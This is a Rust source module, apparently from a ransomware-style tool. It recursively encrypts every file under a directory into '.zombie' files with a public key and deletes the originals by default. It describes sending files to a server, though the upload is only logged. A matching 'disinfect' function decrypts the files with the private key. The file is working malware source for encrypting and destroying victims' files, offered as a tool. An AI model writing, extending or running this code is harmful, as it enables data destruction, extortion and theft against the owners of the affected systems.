//! A module for recursively walking a directory tree, processing
//! files (encrypt, decrypt, exfiltrate), and deleting original files.

use std::{
    collections::HashSet,
    fs,
    io::{self, ErrorKind},
    path::Path,
};

use log::{debug, info};
use walkdir::WalkDir;

use crate::{
    crypto::{EXTENSION, decrypt, encrypt, load_private_key, load_public_key},
    error::AppError,
};

// Rust lifetimes make me wanna cry--pun intended
// Slices are used to avoid informing the number of elements of an array
// Avoiding Vec for better performance, no dynamic allocation--heap
/// Permanent, read-only lists that contain permanent, read-only string references
const EXCLUDED_DIRS: &'static [&'static str] = &[
    ".git",
    ".svn",
    "node_modules",
    "target",
    "__pycache__",
    ".idea",
    ".vscode",
    ".Spotlight-V100",
    ".Trashes",
    ".fseventsd",
];
const EXCLUDED_FILES: &'static [&'static str] = &[
    ".zombie",
    ".DS_Store",
    ".AppleDouble",
    ".LSOverride",
    ".VolumeIcon.icns",
    ".apdisk",
    ".metadata_never_index",
    ".dmg",
    ".pkg",
    ".tmp",
    ".bak",
    ".swp",
    ".swo",
];

/// Walks a directory tree starting from `path`, excluding directories
/// and files based on predefined lists, and encrypts and exfiltrates
/// files. It's like a spores burst--sporulate.
///
/// # Arguments
/// - `path`: Starting directory as a `PathBuf`
/// - `key`: Pathbuf to the private key to decrypt files--see README
/// - `no_delete`: Boolean flag: false means the original file is deleted
/// - `server`: String representing the target server
/// - `target_folder`: `Option<String>` for a specific folder on the server
///
/// # Logic
/// Uses `HashSet` for efficient lookups of excluded names.
/// Iterates through the file system, and for each valid file:
///   - Encrypts the file generating a `.zombie` version
///   - Sends the encrypted file to the target server
///   - Optinally, deletes the original file locally
pub fn sporulate(
    path: &Path,
    key: &Path,
    no_delete: &bool,
    server: &String,
    target_folder: &Option<String>,
) -> Result<(), AppError> {
    if !path.exists() {
        return Err(AppError::Io(io::Error::new(
            ErrorKind::NotFound,
            format!("Path not found: {:?}", path),
        )));
    }

    if !key.is_file() {
        return Err(AppError::Io(io::Error::new(
            ErrorKind::NotFound,
            format!("Key not found: {:?}", key),
        )));
    }

    let public_key = load_public_key(key)?;
    debug!("Loaded private key from {:?}", key);

    let excluded_dirs_set: HashSet<&str> = EXCLUDED_DIRS.iter().cloned().collect();
    let excluded_files_set: HashSet<&str> = EXCLUDED_FILES.iter().cloned().collect();

    // Iterator creation and customization: Takes a path and creates a lazy
    // iterator that traverses the directory tree--only scans the file system
    // as needed.
    // As it finds each file/folder, it immediately applies a filter to check
    // if the item's name should be excluded--see the exclusion lists.
    // Finally, it avoids processing errors, considering only valid entries.
    // The closure returns true to process the entry of false to skip it.
    let walker = WalkDir::new(&path)
        .into_iter()
        .filter_entry(|entry| {
            let file_name = entry.file_name();
            let file_path = entry.path();

            if entry.file_type().is_dir() {
                if let Some(file_name) = file_name.to_str() {
                    if excluded_dirs_set.contains(file_name) {
                        debug!("Skipping folder {}", file_path.display());
                        return false;
                    }
                }
            }

            if entry.file_type().is_file() {
                let path = entry.path();
                let file_name_str = path.file_name().and_then(|name| name.to_str());
                let extension_str = path
                    .extension()
                    .and_then(|ext| ext.to_str())
                    .map(|ext| format!(".{}", ext));

                if file_name_str.map_or(false, |name| excluded_files_set.contains(name))
                    || extension_str.map_or(false, |ext| excluded_files_set.contains(ext.as_str()))
                {
                    debug!("Skipping file {}", file_path.display());
                    return false;
                }
            }
            true
        })
        .filter_map(Result::ok);

    // This loop consumes the walker iterator and as the loop progresses,
    // it asks for the next item from the iterator--this request triggers
    // the iterator to scan the file system!
    info!(
        "Starting encryption process: path={:?}, server={}, target_folder={:?}, no_delete={}",
        path, server, target_folder, no_delete
    );
    for entry in walker {
        // Avoiding directories
        if entry.file_type().is_file() {
            let file_path = entry.path();

            debug!("Encrypting file: {:?}", file_path);
            encrypt(file_path, &public_key)?;

            if !no_delete {
                debug!("Deleting original file: {:?}", file_path);
                fs::remove_file(file_path)?;
            }

            let action_message = format!("Upload {} to server {}", file_path.display(), server);
            if let Some(folder) = &target_folder {
                debug!("{}, target folder {}", action_message, folder);
            } else {
                debug!("{}", action_message);
            }
        }
    }
    info!("Encryption process completed successfully");
    Ok(())
}

/// Traverses a directory tree starting from `path`, looking for `.zombie`
/// files to decrypt them. Disinfects a sporulated file.
///
/// # Arguments
/// - `path`: Starting directory as a `PathBuf`
/// - `key`: Pathbuf to the private key to decrypt files--see README
/// - `no_delete`: Boolean flag: false means the .zombie file is deleted
///
/// # Logic
/// Iterates through the file system, and for each valid file:
///   - Checks if it has the `.zombie` extension
///   - Extracts the `.zombie` file header
///   - Uses the private key provided to decrypt the header
///   - Decrypts the content using the decrypted secret key and IV
pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppError> {
    if !path.exists() {
        return Err(AppError::Io(io::Error::new(
            ErrorKind::NotFound,
            format!("Path not found: {:?}", path),
        )));
    }

    if !key.is_file() {
        return Err(AppError::Io(io::Error::new(
            ErrorKind::NotFound,
            format!("Key not found: {:?}", key),
        )));
    }

    let private_key = load_private_key(&key)?;
    debug!("Loaded main private key from {:?}", key);

    // Creates and sets the directory traversal lazy iterator.
    // Only valid files with the `.zombie` extension are processed.
    let walker = WalkDir::new(&path)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|entry| {
            entry.file_type().is_file()
                && entry.path().extension().and_then(|ext| ext.to_str()) == Some(EXTENSION)
        });

    info!(
        "Starting decryption process: path={:?}, key={:?}",
        path, &key
    );
    for entry in walker {
        let file_path = entry.path();
        debug!("Decrypting file: {:?}", file_path);
        decrypt(file_path, &private_key)?;

        if !no_delete {
            debug!("Deleting .zombie file: {:?}", file_path);
            fs::remove_file(file_path)?;
        }
    }

    info!("Decryption process completed successfully");
    Ok(())
}
